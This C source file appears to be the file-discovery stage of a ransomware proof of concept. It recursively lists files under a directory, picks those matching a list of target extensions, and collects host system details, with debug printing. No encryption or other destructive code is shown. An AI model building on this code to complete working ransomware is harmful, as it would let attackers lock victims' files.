#include "fournights.h"

/**
  * sighandler - traps signals
  * @sig: Signal to trap
 **/
static void sighandler(int sig)
{
	if (sig == SIGINT)
	{
		write(1, "WTF?!", 5);
		exit(1);
	}
}

/**
  * recurse_ls - Searches through a target directory for all files,
 (* and builds a linked list of those files
  * @rootpath: target directory
  * @head: head of the linked list
  * @list_extensions: ptr to a linked list of file extensions
  * Return: Returns a pointer to the head of the linked list
 **/
node_t *recurse_ls(char *dirname, ransom_t *ransom)
{
	size_t len_rootpath, len_filename, calloc_size;
	char *filepath;
	DIR *dir;
	struct dirent *read;
	struct stat file_info;

	dir = opendir(dirname);
	if (!dir)
		return (NULL);
	len_rootpath = my_strlen(dirname);
	len_filename = 0;
	calloc_size = len_rootpath + BUFSIZE;
	filepath = my_calloc(calloc_size, sizeof(char));
	my_strncat(filepath, dirname, 0, len_rootpath);
	while ((read = readdir(dir)))
	{
		if (my_strncmp(read->d_name, ".", 1) == 0 ||
			my_strncmp(read->d_name, "..", 2) == 0)
			continue;
		len_filename = my_strlen(read->d_name);
		if ((len_filename + len_rootpath + 1) > calloc_size)
		{
			recalloc(filepath, calloc_size, calloc_size + BUFSIZE);
			calloc_size += BUFSIZE;
		}
		my_strncat(filepath, read->d_name, len_rootpath, len_filename);
		lstat(filepath, &file_info);
		if (S_ISDIR(file_info.st_mode) != 0)
		{
			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
			recurse_ls(filepath, ransom);
		}
		else if (binary_search_string(read->d_name, len_filename, ransom) != 0)
		{
			add_node(filepath, &ransom->target_files);
		}
	}
	free(filepath);
	closedir(dir);
	return (ransom->target_files);
}

/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * Trap Signals: Disabled for debugging
  * if (signal(SIGINT, SIG_IGN) == SIG_ERR)
  *		puts("signal error\n");
 **/
int main(int ac, char *av[])
{
	int debug_int = 0;
	char **debug_dp = NULL;

	char *default_dir = "/home/vagrant/FourNights/TESTS/";
	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
	char *read_file_buf;
	struct ransom_s ransom;
	struct utsname sys_info;

	ransom.root_path = NULL;
	ransom.file_extensions = NULL; /* goes with read_file_buf */
	ransom.num_of_file_ext = 0;
	ransom.os_info = sys_info;
	ransom.target_files = NULL;
	/* handle signals */
	signal(SIGINT, sighandler);

	/* Start building struct */
	if (ac == 2)
		ransom.root_path = av[1];
	else
		ransom.root_path = default_dir;

	if (uname(&sys_info) == -1)
		perror("uname error:");
	ransom.os_info = sys_info;
	read_file_buf = read_file(file_exts, &ransom, tokenizer);
	ransom.target_files = NULL;
	recurse_ls(ransom.root_path, &ransom);

	/* Struct Built. Printing then freeing. */
	printf("DEBUG 0: root_path: %s\n", ransom.root_path);
	printf("DEBUG 1: os_info.sysname: %s, .nodename: %s, .release: %s, .version: %s, .machine: %s\n", ransom.os_info.sysname, ransom.os_info.nodename, ransom.os_info.release, ransom.os_info.version, ransom.os_info.machine);

	printf("DEBUG 2: file extension list \n");
	debug_dp = ransom.file_extensions;
	for (debug_int = 0; debug_dp[debug_int] != NULL; debug_int++)
		printf("%s%s", debug_int == 0 ? "" : ", ", debug_dp[debug_int]);
	printf("\nHas NULL at end? %s\n", debug_dp[debug_int]);
	printf("Filebuffer: Still alive? (strtok truncates past first file ext) %s\n", read_file_buf);
	printf("Number of extensions to search: %d\n", ransom.num_of_file_ext);
	printf("DEBUG 3: \n");

	free(read_file_buf);
	print_list(ransom.target_files);
	free(ransom.file_extensions);
	free_list(&ransom.target_files);
	return (EXIT_SUCCESS);
}
